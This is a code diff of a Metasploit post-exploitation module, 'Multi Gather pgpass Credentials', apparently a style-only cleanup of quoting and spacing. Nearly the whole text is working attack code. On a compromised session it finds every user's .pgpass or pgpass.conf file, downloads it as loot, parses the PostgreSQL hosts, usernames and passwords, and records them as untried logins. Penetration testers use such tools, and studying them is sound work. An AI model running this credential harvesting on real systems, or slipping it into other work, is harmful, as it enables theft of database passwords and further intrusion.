@@ -8,30 +8,33 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Unix
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'          => 'Multi Gather pgpass Credentials',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather pgpass Credentials',
+        'Description' => %q{
           This module will collect the contents of all users' .pgpass or pgpass.conf
           file and parse them for credentials.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Zach Grace <zgrace[at]403labs.com>'],
-      'Platform'      => %w[linux bsd unix osx win],
-      'SessionTypes'  => %w[meterpreter shell]
-    ))
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Zach Grace <zgrace[at]403labs.com>'],
+        'Platform' => %w[linux bsd unix osx win],
+        'SessionTypes' => %w[meterpreter shell]
+      )
+    )
   end
 
   def run
-    print_status("Finding pgpass creds")
+    print_status('Finding pgpass creds')
 
     files = []
     case session.platform
     when 'unix', 'linux', 'bsd', 'osx'
-      files = enum_user_directories.map {|d| d + "/.pgpass"}.select { |f| file?(f) }
+      files = enum_user_directories.map { |d| d + '/.pgpass' }.select { |f| file?(f) }
     when 'windows'
-      if session.type != "meterpreter"
-        print_error("Only meterpreter sessions are supported on windows hosts")
+      if session.type != 'meterpreter'
+        print_error('Only meterpreter sessions are supported on windows hosts')
         return
       end
 
@@ -47,14 +50,14 @@ class MetasploitModule < Msf::Post
     end
 
     if files.nil? || files.empty?
-      print_error("No users found with a .pgpass or pgpass.conf file")
+      print_error('No users found with a .pgpass or pgpass.conf file')
       return
     end
 
     files.each do |f|
       # Store the loot
       print_good("Downloading #{f}")
-      pgpass_path = store_loot("postgres.pgpass", "text/plain", session, read_file(f), "#{f}", "pgpass #{f} file")
+      pgpass_path = store_loot('postgres.pgpass', 'text/plain', session, read_file(f), f.to_s, "pgpass #{f} file")
       print_good "Postgres credentials file saved to #{pgpass_path}"
       # Store the creds
       parse_creds(f)
@@ -64,21 +67,22 @@ class MetasploitModule < Msf::Post
   # Store the creds to
   def parse_creds(f)
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'Postgres Data',
-      'Indent'  => 1,
+      'Header' => 'Postgres Data',
+      'Indent' => 1,
       'Columns' => ['Host', 'Port', 'DB', 'User', 'Password']
     )
 
     read_file(f).each_line do |entry|
       # skip comments
-      next if entry.lstrip[0,1] == "#"
+      next if entry.lstrip[0, 1] == '#'
+
       ip, port, db, user, pass = entry.chomp.split(/:/, 5)
 
       # Fix for some weirdness that happens with backslashes
-      p = ""
+      p = ''
       bs = false
       pass.split(//).each do |c|
-        if c == "\\"
+        if c == '\\'
           if bs == false
             bs = true
             p << c
@@ -86,12 +90,10 @@ class MetasploitModule < Msf::Post
             # second backslash ignore
             bs = false
           end
+        elsif c == ':' && bs == true
+          p = "#{p[0, p.length - 1]}:"
         else
-          if c == ":" && bs == true
-            p = "#{p[0,p.length-1]}:"
-          else
-            p << c
-          end
+          p << c
         end
       end
 
@@ -101,19 +103,19 @@ class MetasploitModule < Msf::Post
       # sees whatever was actually in the file in case it's weird
       cred_table << [ip, port, db, user, pass]
 
-      if ip == "*" || ip == "localhost"
+      if ip == '*' || ip == 'localhost'
         ip = session.session_host
       else
         ip = Rex::Socket.getaddress(ip)
       end
 
       # Use the default postgres port if the file had a wildcard
-      port = 5432 if port == "*"
+      port = 5432 if port == '*'
 
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: user,
         private_data: pass,
         private_type: :password,
@@ -127,18 +129,17 @@ class MetasploitModule < Msf::Post
       login_data = {
         address: ip,
         port: port,
-        protocol: "tcp",
-        service_name: "postgres",
+        protocol: 'tcp',
+        service_name: 'postgres',
         core: credential_core,
-        access_level: "User",
+        access_level: 'User',
         status: Metasploit::Model::Login::Status::UNTRIED,
         workspace_id: myworkspace_id
       }
       create_credential_login(login_data)
-
     end
 
-    if not cred_table.rows.empty?
+    if !cred_table.rows.empty?
       print_line
       print_line(cred_table.to_s)
     end
